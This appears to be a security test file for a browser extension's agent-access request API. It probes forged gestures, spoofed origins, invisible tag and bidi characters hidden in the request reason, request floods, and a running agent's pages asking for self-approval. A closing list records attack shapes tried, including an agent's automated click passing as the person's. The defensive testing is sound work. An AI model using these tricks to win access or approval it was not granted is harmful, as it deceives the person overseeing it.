    assert.deepEqual(posted, [{ type: "PAGE_TOOL_CANCEL", runId: "r1" }], "one post, the run id alone (positive control: the string one)");
    assert.equal(world.runtimeCalls.length, before, "nothing went back to the worker");
});

// --- ml.requestAccess (site access slice 3 PR 4): what a page gets from asking the person for more ---
// The red-team pass on `ml.requestAccess` (docs/dev/site-access.md, "Sites asking for access"). The threat is a site that
// may already use window.ml, or one that may not, asking for the agent level or self-approval. Each test is a property,
// with its positive control; the oracle is the request store (`ml_site_requests`), the person's lists, and what reached
// the backend, a tab or the screen. A site NOT allowed asking (the stub, "Let sites ask for access") is PR 4b's; here
// such a site is only refused by the origin gate.
const { ASK_REFUSED } = require("../src/site-requests.ts");

const RA = "https://a.example";
/** A page's top frame as the browser stamps its messages. */
const raPage = (tab, origin, o = {}) => ({ tab: { id: tab, url: `${origin}/p` }, url: `${origin}/p`, origin, frameId: 0, documentId: `doc-${tab}`, ...o });
const RA_EXT = { url: "chrome-extension://test/popup.html" };
const raPlain = (x) => JSON.parse(JSON.stringify(x ?? null));
const raDay = 24 * 60 * 60 * 1000;
const ABSENT = Symbol("absent");

/** A worker where `allowed` may use window.ml (agents off unless `agents` says), with every window, tab and focus call
 *  the worker could make recorded as reaching the screen. */
function askWorld({ allowed = [RA], agents = {}, local = {}, onTabMessage } = {}) {
    const screen = [];
    const bg = loadBackground({
        config: baseConfig(), siteGate: true, siteAgents: null,
        openTabs: [{ id: 7, url: `${RA}/p`, title: "A" }],
        local: { ml_site_schema: 2, ml_site_always: allowed, ml_site_agents: agents, ...local },
        onFetch: () => jsonResponse({ choices: [{ message: { content: "spent" } }] }),
        onTabMessage,
    });
    const c = bg.context.chrome;
    for (const [ns, fn] of [["windows", "create"], ["windows", "update"], ["tabs", "create"], ["tabs", "update"], ["tabs", "highlight"], ["action", "openPopup"]]) {
        c[ns] ??= {};
        const orig = c[ns][fn];
        c[ns][fn] = async (...a) => { screen.push(`${ns}.${fn}`); return orig ? orig(...a) : undefined; };
    }
    const ask = (payload, sender = raPage(7, RA), gesture = true, extra = {}) => bg.send({ type: "REQUEST_ACCESS", payload, ...(gesture === ABSENT ? {} : { gesture }), requestId: "r", ...extra }, sender);
    const entries = () => raPlain(bg.localStore.ml_site_requests?.entries ?? []);
    const waiting = async () => raPlain((await bg.send({ type: "ACCESS_REQUESTS", payload: {} }, RA_EXT)).data.requests);
    const levels = async (origin) => raPlain((await bg.send({ type: "SITE_ACCESS", payload: { origin } }, RA_EXT)).data.levels);
    const decide = (origin, decision) => bg.send({ type: "ACCESS_REQUESTS", payload: { origin, decision } }, RA_EXT);
    const outside = () => ({ fetched: bg.calls.length, toTabs: bg.tabMessages.length, captured: bg.captures.length, tabsCreated: bg.tabsCreated.length, screen: screen.length });
    /** Let the worker's own start-up (presence, badges) finish, so what follows is the request's alone. */
    const settled = async () => { for (let i = 0; i < 10; i++) await tick(); };
    return { bg, ask, entries, waiting, levels, decide, outside, screen, settled };
}

/** A stored request, as the worker writes one. */
const raEntry = (o) => ({ origin: RA, domain: "a.example", kind: "access", agents: true, at: Date.now(), state: "pending", asks: 1, ...o });

test("requestAccess — a sender that can never ask is refused and creates nothing; nothing reaches the backend, a tab or the screen", async () => {
    const C = "https://c.example";
    const cases = [
        ["a site that may not use window.ml", raPage(9, C), /not approved/],
        ["a site that may not use window.ml, naming an allowed origin in its payload", raPage(9, C), /not approved/, { origin: RA, url: `${RA}/p` }],
        ["a sub-frame of the allowed site", raPage(7, RA, { frameId: 3, url: `${RA}/frame` })],
        ["an opaque origin (a sandboxed frame) in the allowed site's tab", raPage(7, RA, { origin: "null" })],
        ["a data: document in the allowed site's tab", raPage(7, RA, { origin: "null", url: "data:text/html,x" })],
        ["an about:blank sub-frame the allowed site made", raPage(7, RA, { url: "about:blank", frameId: 2 })],
        ["a file: page", { tab: { id: 7, url: "file:///tmp/x.html" }, url: "file:///tmp/x.html", frameId: 0, documentId: "d-file" }],
        ["the allowed host over http", raPage(7, "http://a.example")],
        ["the allowed host on another port", raPage(7, "https://a.example:8443")],
        ["a subdomain of the allowed host", raPage(7, "https://sub.a.example")],
        ["a sender with no tab", { url: `${RA}/p`, origin: RA, frameId: 0 }],
    ];
    for (const [what, sender, why, extraPayload] of cases) {
        const w = askWorld();
        await w.settled();
        const before = w.outside();
        const r = await w.ask({ agents: true, reason: "x", ...extraPayload }, sender);
        const answer = r?.data ?? r;
        assert.ok(!["pending", "granted"].includes(answer?.state), `${what}: answered ${JSON.stringify(r)}`);
        if (why) assert.match(r?.error || "", why, `${what}: the origin gate's refusal`);
        assert.deepEqual(w.entries(), [], `${what}: an entry was stored`);
        assert.deepEqual(await w.waiting(), [], `${what}: something waits for the person`);
        await tick();
        assert.deepEqual(w.outside(), before, `${what}: something reached the backend, a tab or the screen`);
        assert.equal(w.bg.badges.shown(7).text ?? "", "", `${what}: the badge counts it`);
    }
    // Positive control: the allowed site's top frame, with a gesture, waits for the person, and still reaches nothing.
    const w = askWorld();
    await w.settled();
    const before = w.outside();
    assert.deepEqual(raPlain((await w.ask({ agents: true })).data), { state: "granted", agents: "pending" });
    assert.equal(w.entries().length, 1);
    assert.equal(w.entries()[0].origin, RA, "the origin is the sender's");
    await tick();
    assert.deepEqual(w.outside(), before, "a request opens no window, takes no focus, and spends nothing (rule 5)");
});

test("requestAccess — the stored origin is the sender's: a payload or a message field naming another origin is never read", async () => {
    const w = askWorld({ allowed: [RA, "https://victim.example"] });
    await w.ask({ agents: true, origin: "https://victim.example", url: "https://victim.example/" }, raPage(7, RA), true, { origin: "https://victim.example", sender: { origin: "https://victim.example" } });
    assert.deepEqual(w.entries().map((e) => e.origin), [RA]);
});

test("requestAccess — the worker reads only the content script's own `gesture: true`: the payload's word, a truthy stand-in or its absence create nothing", async () => {
    for (const [what, payload, gesture] of [
        ["gesture in the payload", { agents: true, gesture: true }, false],
        ["the string \"true\"", { agents: true }, "true"],
        ["the number 1", { agents: true }, 1],
        ["an object", { agents: true }, { isTrusted: true }],
        ["absent", { agents: true }, ABSENT],
    ]) {
        const w = askWorld();
        const r = await w.ask(payload, raPage(7, RA), gesture);
        assert.deepEqual(raPlain(r.data), { state: "refused", reason: ASK_REFUSED.gesture }, what);
        assert.deepEqual(w.entries(), [], `${what}: an entry was stored`);
        const s = await w.ask({ level: "self-approve" }, raPage(7, RA), gesture);
        assert.deepEqual(raPlain(s.data), { state: "refused", reason: ASK_REFUSED.gesture }, `${what} (self-approval)`);
    }
});

test("requestAccess — the relay's gesture is the isolated world's: a page's synthetic input, a posted field, activation from our own hosts, or a stale input is no gesture", async () => {
    // The page world shares this mock window with content.js, so a "synthetic" event is one the browser marks
    // isTrusted:false (any script-dispatched event); a trusted one plays the browser's own input. Activation is the
    // browser's (navigator.userActivation in the isolated world), set by the test.
    let now = 100000;
    const world = loadPageWorld({ onRuntimeMessage: (m) => (m.type === "REQUEST_ACCESS" ? { data: { state: "pending" } } : { data: null }) });
    await tick();
    const host = { id: "ml-shell-host" };
    world.context.__mlOwnHosts = new WeakSet([host]);   // what the shell's markOwnHost leaves in the isolated world
    world.context.performance = { now: () => now };
    let active = true;
    world.context.navigator = { get userActivation() { return { isActive: active }; } };
    const input = (o) => world.context.window.dispatchEvent({ type: "pointerdown", isTrusted: true, composedPath: () => [world.context.window], ...o });
    const gestureOf = async (fn) => {
        const n = world.runtimeCalls.length;
        await fn();
        await tick();
        const sent = world.runtimeCalls.slice(n).filter((m) => m.type === "REQUEST_ACCESS");
        assert.equal(sent.length, 1, `one REQUEST_ACCESS was relayed (${sent.length})`);
        return sent[0].gesture;
    };
    const call = () => world.ml.requestAccess({ agents: true });
    now += 60000;   // every input below is the test's own

    assert.equal(await gestureOf(call), false, "activation alone (a click in our card's iframe spreads it to the page) is no gesture");
    input({ isTrusted: false });
    assert.equal(await gestureOf(call), false, "a page-dispatched pointerdown is no gesture");
    world.context.window.dispatchEvent({ type: "keydown", isTrusted: false, composedPath: () => [] });
    assert.equal(await gestureOf(call), false, "a page-dispatched keydown is no gesture");
    input({ composedPath: () => [host, world.context.window] });
    assert.equal(await gestureOf(call), false, "trusted input on the extension's own host is no gesture");
    assert.equal(await gestureOf(() => { world.asInjected({ type: "REQUEST_ACCESS_REQUEST", requestId: "p1", gesture: true, isTrusted: true, payload: { agents: true, gesture: true } }); }), false,
        "a gesture field the page posts beside or inside its request is no gesture");

    // Positive control: the person's own trusted input on the page, just now, with the browser's activation.
    input({});
    assert.equal(await gestureOf(call), true, "positive control: the person's own input is a gesture");
    now += 5001;
    assert.equal(await gestureOf(call), false, "an input older than 5 s is no gesture");
    input({});
    active = false;
    assert.equal(await gestureOf(call), false, "an input without the browser's activation is no gesture");
    active = true;
    assert.equal(await gestureOf(call), true, "positive control again");

    // No other type a page sends becomes a REQUEST_ACCESS, with or without a gesture field.
    const n = world.runtimeCalls.length;
    for (const type of ["REQUEST_ACCESS", "ACCESS_REQUESTS", "ACCESS_REQUESTS_REQUEST", "CONFIG_REQUEST", "SITE_ACCESS_REQUEST"]) world.asInjected({ type, requestId: `x-${type}`, gesture: true, payload: { agents: true, gesture: true } });
    world.context.window.postMessage({ type: "REQUEST_ACCESS_REQUEST", requestId: "w", payload: { agents: true } });
    await tick();
    const types = world.runtimeCalls.slice(n).map((m) => m.type);
    assert.ok(types.includes("GET_CONFIG"), "positive control: CONFIG_REQUEST relays");
    assert.deepEqual(types.filter((t) => t !== "GET_CONFIG"), [], `relayed: ${types}`);
});

test("requestAccess — no page sender answers or reads a request: ACCESS_REQUESTS and SITE_ACCESS refuse every page shape", async () => {
    const w = askWorld({ allowed: [RA] });
    await w.ask({ agents: true });
    await w.ask({ level: "self-approve" }, raPage(8, RA, { documentId: "doc-8" }));   // refused by the domain cap; the access entry waits
    const senders = [raPage(7, RA), raPage(7, RA, { frameId: 4 }), raPage(9, "https://c.example"), raPage(7, RA, { origin: "null" }), { tab: { id: 7, url: `${RA}/p` }, url: `${RA}/p` }];
    const decisions = [{ kind: "access", answer: "agents" }, { kind: "access", answer: "always", agents: true }, { kind: "selfApprove", answer: "allow" }];
    const edits = [{ op: "agents", origin: RA, level: "always" }, { op: "selfApprove", origin: RA, on: true }, { op: "allow", origin: "https://c.example", scope: "always" }];
    const levelsBefore = await w.levels(RA);
    for (const sender of senders) {
        const read = await w.bg.send({ type: "ACCESS_REQUESTS", payload: {} }, sender);
        assert.equal(read?.data, undefined, `${JSON.stringify(sender)} read the waiting list`);
        for (const decision of decisions) {
            const r = await w.bg.send({ type: "ACCESS_REQUESTS", payload: { origin: RA, decision } }, sender);
            assert.equal(r?.data, undefined, `${JSON.stringify(sender)} answered ${JSON.stringify(decision)}`);
        }
        for (const edit of edits) {
            const r = await w.bg.send({ type: "SITE_ACCESS", payload: { edit } }, sender);
            assert.equal(r?.data, undefined, `${JSON.stringify(sender)} edited ${JSON.stringify(edit)}`);
        }
    }
    assert.deepEqual(await w.levels(RA), levelsBefore, "the site's levels are as they were");
    assert.deepEqual((await w.waiting()).map((e) => [e.origin, e.kind, e.state]), [[RA, "access", "pending"]], "the request still waits");
    // The relay never carries them either.
    assert.deepEqual(await pageRelays({ type: "ACCESS_REQUESTS", requestId: "a", payload: {} }, { type: "ACCESS_REQUESTS_REQUEST", requestId: "b", payload: {} }), []);
    // Positive control: the person's popup answers it.
    await w.decide(RA, { kind: "access", answer: "agents" });
    assert.equal((await w.levels(RA)).agents, "ask");
});

test("requestAccess — a request never becomes a different kind: one the person's revoke leaves behind does not wait as a request to use window.ml", async () => {
    const w = askWorld({ allowed: [RA] });
    assert.deepEqual(raPlain((await w.ask({ agents: true, reason: "to run checks" })).data), { state: "granted", agents: "pending" });
    assert.equal((await w.waiting()).length, 1, "positive control: the agents request waits");
    // The person revokes the site from the popup's "This site" block.
    await w.bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "revoke", origin: RA } } }, RA_EXT);
    assert.equal((await w.levels(RA)).use, "unknown", "the site is revoked");
    const left = (await w.waiting()).filter((e) => e.origin === RA && e.kind === "access");
    assert.deepEqual(left.map((e) => ({ allowed: e.allowed })), [], `a revoked site's agents request now waits as a request to use window.ml: ${JSON.stringify(left)}`);
});

test("requestAccess — a self-approval request settles when the site is revoked; the person's answer applies only to the asker's origin", async () => {
    const w = askWorld({ allowed: [RA, "https://b.example"] });
    assert.deepEqual(raPlain((await w.ask({ level: "self-approve" })).data), { state: "pending" });
    await w.bg.send({ type: "SITE_ACCESS", payload: { edit: { op: "revoke", origin: RA } } }, RA_EXT);
    assert.deepEqual(await w.waiting(), [], "a revoked site's self-approval request no longer waits");
    // Answers name an origin: B's entry is answered only for B; an answer for an origin nothing asked for edits nothing.
    await w.ask({ level: "self-approve" }, raPage(8, "https://b.example"));
    await w.decide("https://c.example", { kind: "selfApprove", answer: "allow" });
    await w.decide(RA, { kind: "selfApprove", answer: "allow" });
    assert.equal((await w.levels("https://c.example")).selfApprove, false);
    assert.equal((await w.levels(RA)).selfApprove, false, "an answer to a settled request edits nothing");
    assert.equal((await w.levels("https://b.example")).selfApprove, false, "B is untouched by answers to other origins");
    await w.decide("https://b.example", { kind: "access", answer: "agents" });
    assert.equal((await w.levels("https://b.example")).agents, "off", "an answer of the other kind does not answer B's self-approval request");
    await w.decide("https://b.example", { kind: "selfApprove", answer: "allow" });
    assert.equal((await w.levels("https://b.example")).selfApprove, true, "positive control");
});

test("requestAccess — the reason is stored as at most 200 characters of text, whatever the page passes", async () => {
    for (const [what, reason, want] of [
        ["10,000 characters", "r".repeat(10000), (s) => s.length <= 200],
        ["an object with toString", { toString: () => "OBJ" }, (s) => s === undefined],
        ["an array", ["a", "b"], (s) => s === undefined],
        ["only whitespace", "   \n\t ", (s) => s === undefined],
        ["astral characters past the cap", "😀".repeat(300), (s) => s.length <= 200],
    ]) {
        const w = askWorld();
        await w.ask({ agents: true, reason });
        const e = w.entries();
        assert.equal(e.length, 1, what);
        assert.ok(want(e[0].reason), `${what}: stored ${JSON.stringify(e[0].reason)?.slice(0, 80)}`);
    }
});

test("requestAccess — the reason shows the person every character it holds: bidi overrides and invisible tag characters do not reach the popup or Settings raw", async () => {
    const w = askWorld();
    const tags = [..."hidden"].map((c) => String.fromCodePoint(0xE0000 + c.charCodeAt(0))).join("");
    await w.ask({ agents: true, reason: `to help you‮elbat${tags}` });
    const listed = (await w.waiting())[0].reason;
    assert.ok(listed && listed.startsWith("to help you"), "positive control: the reason is listed");
    assert.ok(!/[‪-‮⁦-⁩]|[\u{E0000}-\u{E007F}]/u.test(listed), `the listed reason carries raw controls: ${JSON.stringify(listed)}`);
});

test("requestAccess — a flood leaves one request: 1,000 calls from one origin, across tabs and documents, at once", async () => {
    const w = askWorld();
    const all = await Promise.all(Array.from({ length: 1000 }, (_, i) => w.ask({ agents: i % 2 === 0, reason: `r${i}` }, raPage(7 + (i % 5), RA, { documentId: `doc-${i}` }))));
    assert.ok(all.every((r) => r.data && ["granted", "pending", "refused"].includes(r.data.state)), "every call was answered");
    const e = w.entries();
    assert.equal(e.length, 1, `${e.length} entries`);
    assert.equal((await w.waiting()).length, 1);
    await tick();
    assert.equal(w.bg.badges.shown(7).text, "1");
    assert.equal(w.outside().screen, 0);
});

test("requestAccess — the per-domain cap counts by registrable domain: subdomains, ports, schemes, case and a trailing dot are one requester", async () => {
    const origins = ["https://x.example.co.uk", "https://a.x.example.co.uk", "https://b.a.x.example.co.uk", "https://x.example.co.uk:8443", "http://x.example.co.uk", "https://x.example.co.uk."];
    const w = askWorld({ allowed: origins });
    const r = await Promise.all(origins.map((o, i) => w.ask({ agents: true }, raPage(10 + i, o))));
    const pending = w.entries().filter((e) => e.state === "pending");
    assert.equal(pending.length, 1, `pending: ${pending.map((e) => e.origin)}`);
    assert.equal(r.filter((x) => x.data?.state === "refused" && x.data.reason === ASK_REFUSED.full).length, origins.length - 1);
    // An upper-case host the browser hands over is the same origin, and the same requester.
    const up = await w.ask({ level: "self-approve" }, { tab: { id: 30, url: "https://X.EXAMPLE.co.uk/p" }, url: "https://X.EXAMPLE.co.uk/p", frameId: 0, documentId: "d-up" });
    assert.notEqual(up.data?.state, "pending");
    assert.equal(w.entries().filter((e) => e.state === "pending").length, 1);
    // Positive control: the private part of the PSL makes each github.io site its own.
    const g = askWorld({ allowed: ["https://a.github.io", "https://b.github.io"] });
    await g.ask({ agents: true }, raPage(7, "https://a.github.io"));
    await g.ask({ agents: true }, raPage(8, "https://b.github.io"));
    assert.equal(g.entries().filter((e) => e.state === "pending").length, 2);
});

test("requestAccess — at most 5 requests wait in all, even when six sites ask at once", async () => {
    const origins = ["a", "b", "c", "d", "e", "f"].map((s) => `https://${s}.example`);
    const w = askWorld({ allowed: origins });
    const r = await Promise.all(origins.map((o, i) => w.ask({ agents: true }, raPage(10 + i, o))));
    assert.equal(w.entries().filter((e) => e.state === "pending").length, 5);
    assert.equal(r.filter((x) => x.data?.reason === ASK_REFUSED.full).length, 1);
    await tick();
    assert.equal(w.bg.badges.shown(10).text, "5");
});

test("requestAccess — expiry and the single re-ask are the worker's: a page cannot reset them by reloading, another tab, or asking the other way", async () => {
    // Twice expired: denied by default, no new entry, with a gesture, from a fresh tab and document.
    const old = Date.now() - 8 * raDay;
    const w = askWorld({ local: { ml_site_requests: { v: 1, entries: [raEntry({ at: old, asks: 2 })] } } });
    const r = await w.ask({ agents: true }, raPage(12, RA, { documentId: "fresh" }));
    assert.deepEqual(raPlain(r.data), { state: "granted", agents: "off" });
    assert.equal(w.entries().filter((e) => e.state === "pending").length, 0, "nothing waits");
    const r2 = await w.ask({ agents: false }, raPage(13, RA, { documentId: "fresh-2" }));
    assert.equal(r2.data.state, "granted");
    assert.equal(w.entries().filter((e) => e.state === "pending").length, 0, "asking without agents does not reset the count");
    // Once expired: one re-ask, counted.
    const w1 = askWorld({ local: { ml_site_requests: { v: 1, entries: [raEntry({ at: old, asks: 1 })] } } });
    await w1.ask({ agents: true }, raPage(12, RA, { documentId: "fresh" }));
    assert.deepEqual(w1.entries().map((e) => [e.state, e.asks]), [["pending", 2]]);
    // A pending entry from another tab and document is the same entry: no second.
    await w1.ask({ agents: true }, raPage(14, RA, { documentId: "again" }));
    assert.deepEqual(w1.entries().map((e) => [e.state, e.asks]), [["pending", 2]]);
    // A self-approval asked twice and expired twice is denied too.
    const ws = askWorld({ local: { ml_site_requests: { v: 1, entries: [raEntry({ kind: "selfApprove", agents: false, at: old, asks: 2 })] } } });
    assert.deepEqual(raPlain((await ws.ask({ level: "self-approve" })).data), { state: "denied" });
    assert.equal(ws.entries().filter((e) => e.state === "pending").length, 0);
});

test("requestAccess — the answer is the documented AccessAnswer and nothing more, in every state", async () => {
    const reasons = new Set(Object.values(ASK_REFUSED));
    const check = (what, a) => {
        const keys = Object.keys(a).sort().join();
        if (a.state === "granted") { assert.equal(keys, "agents,state", what); assert.ok(["granted", "pending", "denied", "off"].includes(a.agents), what); }
        else if (a.state === "refused") { assert.equal(keys, "reason,state", what); assert.ok(reasons.has(a.reason), `${what}: ${a.reason}`); }
        else { assert.ok(["pending", "denied"].includes(a.state), what); assert.equal(keys, "state", what); }
        assert.ok(!/b\.example|c\.example|sk-|host\//.test(JSON.stringify(a)), `${what} names another site or the config: ${JSON.stringify(a)}`);
    };
    const w = askWorld({ allowed: [RA, "https://b.example"] });
    await w.ask({ agents: true }, raPage(8, "https://b.example"));   // another site waits
    check("no gesture", raPlain((await w.ask({ agents: true }, raPage(7, RA), false)).data));
    check("agents, first", raPlain((await w.ask({ agents: true })).data));
    check("agents, pending", raPlain((await w.ask({ agents: true })).data));
    check("self-approval while agents wait (one per domain)", raPlain((await w.ask({ level: "self-approve" })).data));
    check("a level that is not one", raPlain((await w.ask({ level: "admin" })).data));
    await w.decide(RA, { kind: "access", answer: "deny" });
    check("agents denied", raPlain((await w.ask({ agents: true })).data));
    check("self-approval asked", raPlain((await w.ask({ level: "self-approve" })).data));
    await w.decide(RA, { kind: "selfApprove", answer: "deny" });
    check("self-approval denied", raPlain((await w.ask({ level: "self-approve" })).data));
});

test("requestAccess — a page learns nothing of other sites or of the person having looked: its answer is the same either way", async () => {
    const sequence = async (others, look) => {
        const w = askWorld({ allowed: [RA, "https://b.example", "https://c.example"] });
        if (others) { await w.ask({ agents: true }, raPage(8, "https://b.example")); await w.ask({ level: "self-approve" }, raPage(9, "https://c.example")); }
        const out = [raPlain((await w.ask({ agents: true })).data)];
        if (look) { await w.waiting(); await w.waiting(); }
        out.push(raPlain((await w.ask({ agents: true })).data), raPlain((await w.ask({ agents: true }, raPage(7, RA), false)).data));
        return out;
    };
    const base = await sequence(false, false);
    assert.deepEqual(base[0], { state: "granted", agents: "pending" }, "positive control: the request was made");
    assert.deepEqual(await sequence(true, false), base, "other sites' requests change the answer");
    assert.deepEqual(await sequence(false, true), base, "the person opening the popup changes the answer");
});

test("requestAccess — an error on the way back carries neither the server URL nor the key", async () => {
    const w = askWorld();
    const local = w.bg.context.chrome.storage.local;
    const set = local.set;
    local.set = async (obj) => { if (obj && "ml_site_requests" in obj) throw new Error("write failed for http://host/api/chat/completions with sk-SECRET-KEY"); return set(obj); };
    const r = await w.ask({ agents: true });
    const text = JSON.stringify(r);
    assert.ok(r?.error, `positive control: the write failed and the page was told (${text})`);
    assert.ok(!/sk-SECRET-KEY|http:\/\/host/.test(text), `the page read ${text}`);
});

test("requestAccess — a page a running agent opened is refused and recorded on the run, never shown; another tab asks", async () => {
    let release;
    const hold = new Promise((r) => { release = r; });
    const events = [];
    const bg = loadBackground({
        config: baseConfig(), siteGate: true, siteAgents: null,
        openTabs: [{ id: 7, url: `${RA}/p` }, { id: 8, url: `${RA}/p` }, { id: 9, url: `${RA}/p` }],
        local: { ml_site_schema: 2, ml_site_always: [RA], ml_site_agents: { [RA]: "always" } },
        onFetch: (c) => jsonResponse(c.url.includes("/chat/completions") && bg.calls.filter((x) => x.url.includes("/chat/completions")).length === 1
            ? { choices: [{ message: { content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "findByText", arguments: "{}" } }] } }] }
            : { choices: [{ message: { content: "done" } }] }),
        onTabMessage: async (tabId, msg) => {
            if (msg.type === "ML_DEBUG_TO_PAGE") events.push({ tabId, ...raPlain(msg.event) });
            if (msg.type === "RUN_TOOL_IN_PAGE") { if (!msg.payload.finish) await hold; return { result: "ok" }; }
            return undefined;
        },
    });
    const tool = { name: "findByText", description: "find", parameters: { type: "object", properties: {} }, requiresApproval: false, capabilities: [] };
    const run = bg.send({ type: "START_RUN", payload: { runId: "r1", task: "t", systemPrompt: "S", tools: [tool], model: "m", think: null, maxSteps: 3, autoApprovePython: false, autoApproveReadonly: false, surface: "off" } }, raPage(7, RA));
    for (let i = 0; i < 400 && bg.calls.length < 1; i++) await tick();
    bg.openedFrom(7, 8, `${RA}/p`);   // the run's page opened tab 8
    bg.commit(7, { documentId: "doc-7b", url: `${RA}/next` });   // and the run navigated its own tab
    const opened = await bg.send({ type: "REQUEST_ACCESS", payload: { level: "self-approve", reason: "let me" }, gesture: true }, raPage(8, RA));
    assert.deepEqual(raPlain(opened.data), { state: "refused", reason: ASK_REFUSED.openedByAgent });
    const navigated = await bg.send({ type: "REQUEST_ACCESS", payload: { level: "self-approve" }, gesture: true }, raPage(7, RA, { documentId: "doc-7b", url: `${RA}/next` }));
    assert.deepEqual(raPlain(navigated.data), { state: "refused", reason: ASK_REFUSED.openedByAgent });
    assert.deepEqual(raPlain(bg.localStore.ml_site_requests?.entries ?? []), [], "nothing waits for the person");
    assert.ok(events.some((e) => e.kind === "agent-note" && e.id === "r1"), "recorded on the run that opened it");
    release();
    await run;
    // Positive control: a tab nothing opened asks, and waits.
    const other = await bg.send({ type: "REQUEST_ACCESS", payload: { level: "self-approve" }, gesture: true }, raPage(9, RA));
    assert.deepEqual(raPlain(other.data), { state: "pending" });
});

test("PROBED AND NOT GOTTEN: the shapes this pass tried against ml.requestAccess and why each is not pinned further", () => {
    const reasons = [
        "markup in the reason (<b>, <img onerror>): already pinned, popup-whitelist.test.js 'site's words never become markup' and sidebar-settings.test.js the same, both textContent/JSX",
        "REQUEST_ACCESS from an unapproved origin: also enumerated by the HANDLE_MAP sweep above ('EVERY page-started message type is refused')",
        "ACCESS_REQUESTS from one of our own frames inside a hostile tab (the overlay sidebar): isExtensionSender is true by design; the page cannot drive that frame (closed shadow root, top layer, attack 17)",
        "ACCESS_REQUESTS with a malformed decision (answer: 'forever', kind: 'x'): refused since (isRequestDecision), pinned in request-access-bg.test.mjs; only an extension sender reaches it either way",
        "two kinds from one click (agents, then self-approve within 5 s): the second is refused by the one-per-domain cap, pinned in 'no page sender answers or reads a request' setup",
        "the content script's one-in-flight coalescing answers a later call of the other kind with the first's answer: confusion of the page's own calls only, no entry, no grant",
        "the global cap of 5 can be filled by five allowed sites on five domains, refusing a sixth: by design (rule 6), and in PR 4 each must already be allowed",
        "the 'full' refusal tells a page that a same-site subdomain or five sites are waiting: rule 6's documented cost, the count and origins are never named",
        "an agent's own trusted input (a CDP click on a page the person started a run on, not opened by it) is a gesture hasPageGesture cannot tell from the person's: NOT probed (needs e2e with CDP), reported to the owner as an open question",
        "IP hosts and localhost: each IP is its own requester, localhost on any port is one (tldts gives null, the host counts): matches the rule, no page gain",
        "the handler's own grantableOrigin check (background.ts REQUEST_ACCESS) sits behind the origin gate, which refuses every shape it does first; removing it fails no test, since a sender with no tab is refused on tabId alone",
    ];
    assert.equal(reasons.length, 11);
    assert.ok(reasons.every((s) => s.length > 20));
});
